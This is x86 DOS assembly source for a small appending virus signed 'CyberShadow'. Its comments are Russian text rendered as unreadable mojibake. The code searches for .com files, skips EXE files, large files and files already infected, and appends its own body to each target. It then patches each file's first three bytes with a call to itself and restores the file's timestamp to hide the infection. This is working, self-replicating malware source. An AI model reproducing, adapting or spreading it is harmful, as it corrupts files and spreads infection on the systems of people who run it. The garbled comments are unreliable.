.model tiny
.code
org 100h
;--------------------------------------
;旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴커
;� 뤲Ðβ ㏇�� ˘席젶젹 葉�좐蟯� 쓵�, �� 若ギㄽ�． ．昔쩆 댽ゃ恂첓!           �
;� 뤲�笹泣젪 �昔 獸, 譽� ⓣゃ恂첓� □졻쥯 貰〃�젰恂� � ˘席젶�㏇ゃ� ｀承��, � �
;� 쩆┘ �誘信첓荻  聲�� ╉惜젷, � 誓鼇� ��ㄺÞ呻� 聲�� ㄵ與レ�瑜 ˘黍� � ˘ㄵ �
;� 侁�ぎ� � ��첓쭬筍, 譽� М┃� 誠�쳽筍 �� �黍Ж殊쥯. Enjoy it...             �
;�                                      CyberShadow...                        �
;읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴켸
; 롟獸昔┃�, 若筍 將� �昔짛 � �� 誓㎤ㄵ�狩좑 �췅 쭬�젲젰� 蓀젳� ㏇� 몠� �昔（
; � 收ゃ耀� ㄸ誓も�黍� (� ��キ臾 �恂呻聲��� ヮ〓� 졻循Æ呻��, 譽� 誠�쳽��
; 召ζ쯄レ��, 若舜 も� 쭬若曄�, ㏇� �젪�� ��誓ㄵ쳽β!)
;--------------------------------------

Const1 = offset FreeByte - offset Start
Const2 = offset EndVirus - offset Start

Begin:  call Start

;--------------------------------------
Start:  cld
        pop DI
        mov BP,3
        sub DI,BP                    ;- DI=100h
        push DI
;      -------------------------------
        mov SI,DS:[100h+1]           ;�
        add SI,103h                  ;� SI=Begin addres
        push SI                      ;�
;      -------------------------------
        add SI,Const1                ;�
        push SI                      ;�
        movsw                        ;� �쩺��ⓤ젷� 칛젪Œ彛瑜
        movsb                        ;�    �쩺�瑜 3 줎⒱�.
;      --------------------------------
        mov DX,SI                    ;�
        sub CX,CX                    ;� 췅獄� �쩺¡� º� �젵쳽.
        mov AH,4eh                   ;�
        int 21h                      ;�
        pop SI DI                    ;�
;--------------------------------------
Next:
        cmp word ptr ds:[9ah],61000  ;� ㄻÞ� ‘レ蜈 61000 줎⒱
        ja exit                      ;� 쩆-�猶젷Ð젰п�
        mov DX,80h+1eh               ;�
        mov AX,3d02h                 ;� �洙p維� �젵�.
        int 21h                      ;�
        jc exit                      ;�
        mov BX,AX                    ;�
;      --------------------------------
        mov DX,SI                    ;�
        mov CX,BP                    ;� 葉�젰� �쩺�瑜 3 줎⒱�
        mov AH,3fh                   ;�
        int 21h                      ;�
;      --------------------------------
        cmp byte ptr ds:[si],0e8h    ;� �昔´黍п� 췅 쭬�젲���� (E8h-call)
        je close_file                ;� 쩆-�猶젷Ð젰п�
        cmp word ptr ds:[si],'ZM'    ;� � �� EXE-鈺Ø エ � 췅�?
        je close_file                ;� 쩆-�猶젷Ð젰п�
        mov ax,5700h                 ;�
        int 21h                      ;� 貰魚젺Œ� №�э � 쩆栒 �젵쳽
        push dx                      ;�
        push cx                      ;�
        mov AL,2                     ;�
        call Proc1                   ;� �쩺�Д飡Œⓤ�
        sub SI,BP                    ;�  췅 ぎ�ζ �.
        sub AX,BP                    ;�
        mov [SI+1],AX                ;�
;      --------------------------------
        mov DX,DI                    ;�
        mov CX,Const2                ;�
        mov AH,40h                   ;� 쭬�ⓤ젷� 收ギ ˘說��
        int 21h                      ;�
;      --------------------------------
        mov AL,0                     ;� �쩺�Д飡Œⓤ�
        call Proc1                   ;� 췅 췅�젷� �젵쳽
;      --------------------------------
        mov DX,SI                    ;�
        mov CX,BP                    ;� ��飡젪Œ� call 췅 ˘說�
        mov AH,40h                   ;� � 췅�젷� �젵쳽
        int 21h                      ;�
;      --------------------------------
        pop cx                       ;� ¡遜�젺�˘エ №�э � 쩆栒
        pop dx                       ;�
        mov ax,5701h                 ;�
        int 21h                      ;�
        add si,bp
close_file:
        sub si,bp
        mov AH,3eh                   ;� 쭬챥維� �젵�
        int 21h                      ;�
;      --------------------------------
        add SI,BP                    ;�
        mov AH,4fh                   ;�
        int 21h                      ;� 笹ⅳ莘蟯� �젵�
        jnc next                     ;�
;--------------------------------------
exit:
	ret
        db 'Example by CyberShadow...' ; ㄵ與レ�硫 ぎ�ⓣ젵�
;--------------------------------------
Proc1:
        sub DX,DX                    ;- 듽褻�� � �젵�
        sub CX,CX                    ;
        mov AH,42h                   ;
        int 21h                      ;
        ret                          ;
;--------------------------------------
Jump:           call Begin           ;- 將� ▲ㄵ� 쭬�ⓤ젺� � 췅�젷� �昔（
FreeByte:       nop                  ;� � 將� Д飡� ��� ��舒瑜 3 줎⒱� �昔（
                nop                  ;�
                ret                  ;�
Fname           db '*.com',0         ; 쵟稅� �젵쳽
EndVirus:                            ; GAME OVER!
;--------------------------------------
end begin
